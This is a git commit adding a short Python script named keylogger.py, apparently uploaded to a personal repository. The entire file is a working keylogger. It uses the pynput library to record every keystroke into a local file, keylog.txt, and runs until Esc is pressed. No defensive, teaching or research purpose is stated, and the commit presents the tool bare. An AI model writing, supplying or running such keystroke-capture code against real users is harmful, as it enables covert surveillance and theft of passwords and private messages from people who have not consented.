dc28678000a7ce43b99ad22ac115cbee2a3fa9e5
Dev.omori <omori.laster2020@gmail.com>
2024-07-25 19:23:09 +0330

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,20 @@
+from pynput import keyboard
+#dev.omori
+def on_press(key):
+    try:
+        with open("keylog.txt", "a") as log_file:
+            log_file.write(f"{key.char}")
+    except AttributeError:
+        with open("keylog.txt", "a") as log_file:
+            log_file.write(f"{key}")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+# Collect events until released
+with keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+    listener.join()
